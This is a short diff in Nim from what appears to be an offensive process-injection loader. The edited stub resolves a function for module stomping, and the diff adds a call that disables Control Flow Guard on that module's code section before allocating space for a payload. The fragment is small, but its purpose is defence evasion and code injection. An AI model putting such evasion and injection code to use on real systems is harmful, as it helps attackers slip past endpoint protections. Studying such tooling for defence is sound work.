@@ -131,6 +131,9 @@ let LocalInjectStub*  = """
                     buffer = GetProcAddress(cast[HMODULE](module), stombFunc)
                     when defined(verbose):
                         echo obf("[*] Found stomb function: "), repr(buffer), " ", stombFunc
+                    
+                    # disable CFG for that modules .text section
+                    discard evadeCFG(-1, (cast[PVOID](buffer) + 0x1000))
 
                     var allocationSize: SIZE_T = cast[SIZE_T](dataSz) + 0x1000
                     
